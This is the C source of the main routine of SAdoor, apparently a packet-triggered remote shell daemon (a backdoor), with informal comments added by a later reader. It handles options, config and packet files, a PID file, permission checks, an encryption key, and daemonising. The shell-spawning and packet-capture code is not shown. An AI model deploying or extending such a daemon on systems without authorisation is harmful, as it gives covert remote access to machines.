/*
 *  File: sadoor.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor main routine.
 *  Version: 1.0
 *  Date: Tue Jan  7 23:24:15 CET 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <libgen.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <stdarg.h>
#include "sadoor.h"

/* Global variables */
struct sa_pkts *packets; // packet counts, key packets, command packets
struct sa_options opt; // set of options specified in sadc.h
struct capture *cap; // represents a packet capture. includes IP stuff, packetCapture obj, and others

/* Local functions */
static void sadoor_usage(u_char *);
static void filechk(const u_char *, ...);

static void
sadoor_usage(u_char *prog) // usage prompt to be printed in case of -h prompt
{
	printf("Usage: %s [Option(s)]\n", prog);
	printf("\nOptions:\n");
	printf(" -c file   - Config file to use \n");
	printf(" -h        - This help\n");
	printf(" -n        - Do not attempt to resolve hostnames\n");
	printf(" -v        - Print version and exit\n");
	printf(" -t sec    - Connect/Listen timeout in seconds\n");
	printf("\n");
}


/*
 * Print a warning message if file is not owned by
 * root or has bits set for others.
 * This function assumes that the list of files is
 * terminated by a NULL pointer.
 */
static void
filechk(const u_char *file, ...)
{
	struct stat sb;
	const u_char *fpt;
	va_list ap;

	va_start(ap, file);
	fpt = file;

	while (fpt != NULL) { // loops through file list and prints warnings if root isn't owner, or file is world r/w/e

		if (stat(fpt, &sb) != -1) {
			
			if (sb.st_uid != 0)
				fprintf(stderr, "** WARNING: root is not the owner of %s\n", fpt);
			if (sb.st_mode & 01)
				fprintf(stderr, "** WARNING: %s is world executable (!?)\n", fpt);
			if (sb.st_mode & 02)
				fprintf(stderr, "** WARNING: %s is world writable\n", fpt);
			if (sb.st_mode & 04)
				fprintf(stderr, "** WARNING: %s is world readable\n", fpt);
		}
		fpt = va_arg(ap, u_char *);
	}
}


/*
 * o Read configuration
 * o Read packets
 * o Become daemon and wait for packets
 */
int
main(int argc, char *argv[])
{
	struct stat sb; // statistics variable not used till waaaay down in the code
	int	flag;
	int fd;

//	if (getuid() && geteuid()) 
	//	fprintf(stderr, "SAdoor needs root privileges to run\n");

	/* No need to .. but what the heck .. */
	// initialize option and satistic vars to 0
	memset(&opt, 0x00, sizeof(opt));
	memset(&sb, 0x00, sizeof(struct stat));
	
	/* Default values */
	opt.sao_pname = (argv[0] == NULL ? "sadoor" : argv[0]);
	opt.sao_pktconf = SADOOR_PKTCONFIG_FILE;
	opt.sao_saconf = SADOOR_CONFIG_FILE;
	opt.sao_keyfile = SADOOR_KEY_FILE;
	opt.sao_shell = SADOOR_SHELL;
	opt.sao_logfac = SADOOR_SYSLOG_FACILITY;
	opt.sao_logpri = SADOOR_SYSLOG_PRIORITY;
	opt.sao_pidfile = SADOOR_PID_FILE;
	opt.sao_privlog = SADOOR_PRIVLOG;
	opt.sao_sadbfile = SADOOR_SADBFILE;
	opt.sao_resolve = 1;
	opt.sao_usepidf = 1; /* Use PID file as default */
	opt.sao_ctout = CONNECTION_TIMEOUT;

	// gets the input options h,n,v, and t&c have options following them. assigns to flag used in the folowing switch
	while ( (flag = getopt(argc, argv, "hc:nvt:")) != -1) {
		
		switch(flag) {
			// new config file
			case 'c': 
				opt.sao_saconf = strdup(optarg); 
				break;
			// help
			case 'h': 
				sadoor_usage(opt.sao_pname); 
				exit(EXIT_SUCCESS); 
				break;
				// don't resolves hostnames
			case 'n':
				opt.sao_resolve = 0;
				break;
			// connection timeout
			case 't':
				if (strisnum(optarg, &opt.sao_ctout) < 0) {
					fprintf(stderr, "Bad timeout value\n");	
					exit(EXIT_FAILURE);
				}
				break;
				// print version and exit
			case 'v': 
				printf("%s\n", VERSION); 
				exit(EXIT_SUCCESS); 
				break;
			// is no arg entered / none of the above
			default:
				fprintf(stderr, "Try '%s -h' for help\n", opt.sao_pname);
				exit(EXIT_FAILURE);
				break;
		}
	}

    /* Read config file */
    if (sadc_readconf(opt.sao_saconf, &opt) != 0) 
        exit(EXIT_FAILURE);

	/* Refuse to run if all commands are disabled */
	if ((opt.sao_nosingle && opt.sao_noaccept && opt.sao_noconnect) && 
			(opt.sao_defcmd == NULL)) {
		fprintf(stderr, "** Error: All commands are disabled, I refuse to run\n");
		exit(EXIT_FAILURE);
	}

	/* Check for pidfile */
	// if the file exists means another sad00r process using it and so exits in failure
	if ( (fd = open(opt.sao_pidfile, O_RDONLY)) > 0) {
		u_char buf[12];
		long n;

		memset(buf, 0x00, sizeof(buf)); // initialize buf to 0
		
		if ( (n = read(fd, buf, sizeof(buf))) == -1) 
			fprintf(stderr, "read(%s, ..): %s", 
				opt.sao_pidfile, strerror(errno));
		else {

			if (buf[n-1] == '\n')
				buf[n-1] = '\0';

			if (!strisnum(buf, &n)) {
				fprintf(stderr, "** Error: the file %s exists but is not a PID file\n", 
					opt.sao_pidfile);
				close(fd);
				exit(EXIT_FAILURE);
			}
		
			fprintf(stderr, "There is already a sadoor process"
				" running with PID %s.\n", buf);
			fprintf(stderr, "Either kill the process or delete %s.\n", 
				opt.sao_pidfile);
		}
		close(fd);
		exit(EXIT_FAILURE);
	}

	/* Read packets */
	if ( (packets = sapc_getpkts(opt.sao_pktconf)) == NULL) {
		fprintf(stderr, "** Error reading packets from %s\n", 
			opt.sao_pktconf);
		exit(EXIT_FAILURE);
	}

	/* Check file permissions */
	filechk(opt.sao_pktconf, opt.sao_saconf, 
		opt.sao_keyfile, opt.sao_privlog, NULL);

#ifndef SADOOR_DISABLE_ENCRYPTION

	/* Open key file */
	if ( (fd = open(opt.sao_keyfile, O_RDONLY)) < 0) {
		fprintf(stderr, "** Error: open keyfile %s: %s\n", 
			opt.sao_keyfile, strerror(errno));
		
		if (errno == ENOENT) { 
			fprintf(stderr, "Generate a new keyfile, like:\n");
			fprintf(stderr, "# /bin/dd if=/dev/srandom of=%s bs=56 count=1\n", 
				opt.sao_keyfile);
		}
		exit(EXIT_FAILURE);
	}

	if (fstat(fd, &sb) < 0) {
		fprintf(stderr, "** Error: fstat(): %s: %s\n", 
			opt.sao_keyfile, strerror(errno));
		exit(EXIT_FAILURE);
	}

	if (sb.st_size == 0) {
		fprintf(stderr, "** Error: key file %s is empty!\n", 
			opt.sao_keyfile);
		exit(EXIT_FAILURE);
	}

	/* Check that keyfile contains 56 bytes */
	if (sb.st_size < sizeof(opt.sao_bfkey)) {
		fprintf(stderr, "** Error: Key file %s does only contain %u bytes.\n", 
			opt.sao_keyfile, (u_int)sb.st_size);
		fprintf(stderr, "** Error: SAdoor requires a key size of %u bytes to run.\n", 
			(u_int)sizeof(opt.sao_bfkey));
		exit(EXIT_FAILURE);
	}

	/* Read the key */
	if (readn(fd, opt.sao_bfkey, sizeof(opt.sao_bfkey)) != sizeof(opt.sao_bfkey)) {
		fprintf(stderr, "** Error readn(): %s: %s", 
			opt.sao_keyfile, strerror(errno));
		exit(EXIT_FAILURE);
	}
	close(fd);

#endif /* SADOOR_DISABLE_ENCRYPTION */

	/* Become Beastie */
	go_daemon(); // not sure what this runs, cant find where it is implemented. in one of the files in the package

	/* Hopefully unreached */
	exit(EXIT_FAILURE);
}
